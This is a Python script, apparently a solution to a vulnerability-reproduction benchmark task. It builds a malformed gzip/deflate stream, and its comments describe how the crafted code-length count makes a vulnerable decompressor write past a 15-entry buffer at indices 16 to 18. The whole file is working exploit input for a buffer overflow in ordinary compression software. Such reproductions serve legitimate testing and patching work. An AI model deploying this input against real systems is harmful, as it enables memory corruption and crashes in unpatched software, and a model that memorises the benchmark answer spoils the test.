import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal GZIP header (10 bytes)
        # ID1=1f, ID2=8b, CM=8, FLG=0, MTIME=0, XFL=0, OS=0
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
        
        bits = []
        
        def add_bits(val, n):
            # Standard LSB-first packing for fixed-width fields
            for i in range(n):
                bits.append((val >> i) & 1)
        
        def add_val_reverse(val, n):
            # MSB-first packing for Huffman codes
            for i in range(n - 1, -1, -1):
                bits.append((val >> i) & 1)

        # Deflate Block Header
        add_bits(1, 1) # BFINAL = 1
        add_bits(2, 2) # BTYPE = 2 (Dynamic Huffman)
        
        # Dynamic Huffman Header
        # HLIT = 0 -> 257 Literal/Length codes (257)
        add_bits(0, 5) 
        # HDIST = 0 -> 1 Distance code (1)
        add_bits(0, 5) 
        # HCLEN = 1 -> 5 Code Length codes (4 + 1)
        # The loop runs for 5 iterations: indices 16, 17, 18, 0, 8.
        # Vulnerability: The vulnerable version has buffer size 15.
        # Writing to indices 16, 17, 18 (first 3 iterations) overflows the buffer.
        add_bits(1, 4) 
        
        # Code Lengths (3 bits each)
        # Indices: 16, 17, 18, 0, 8
        # We need to define a Huffman tree for the code lengths to encode the tree structure.
        # We need Symbol 18 (Repeat 0) and Symbol 8 (Length 8).
        # We assign:
        # 16: Length 3 (filler to complete tree)
        # 17: Length 0 (unused)
        # 18: Length 1 (Code 0)
        # 0:  Length 2 (Code 10)
        # 8:  Length 3 (Code 110)
        # Filler 16 gets Code 111
        # Values to write:
        # Idx 0 (16): 3
        # Idx 1 (17): 0
        # Idx 2 (18): 1
        # Idx 3 (0):  2
        # Idx 4 (8):  3
        table = [3, 0, 1, 2, 3]
        for v in table:
            add_bits(v, 3)
            
        # Huffman Tree Definition (encoded using the above tree)
        # Literal/Length Tree:
        # We need 256 zeros (for 0..255).
        # Use Symbol 18 (Code 0) with count 138 (max): 7 bits '1111111'
        add_val_reverse(0, 1)
        add_bits(127, 7) # 138 - 11 = 127
        # Remaining 118 zeros.
        # Use Symbol 18 (Code 0) with count 118: 7 bits '1101011'
        add_val_reverse(0, 1)
        add_bits(107, 7) # 118 - 11 = 107
        
        # Literal 256 (EOB): Length 8
        # Use Symbol 8 (Code 110)
        add_val_reverse(6, 3)
        
        # Distance Tree:
        # Distance 0: Length 8
        # Use Symbol 8 (Code 110)
        add_val_reverse(6, 3)
        
        # Compressed Data
        # Output EOB (Literal 256).
        # In the defined tree, Literal 256 has Length 8.
        # It is the only code of length 8, so its code is all zeros (Canonical Huffman).
        add_val_reverse(0, 8)
        
        # Pack bits into bytes
        byte_array = bytearray()
        cur = 0
        cnt = 0
        for b in bits:
            if b:
                cur |= (1 << cnt)
            cnt += 1
            if cnt == 8:
                byte_array.append(cur)
                cur = 0
                cnt = 0
        if cnt > 0:
            byte_array.append(cur)
            
        # GZIP Trailer (8 bytes)
        # CRC32 (0) and ISIZE (0) for empty content
        trailer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        return header + bytes(byte_array) + trailer
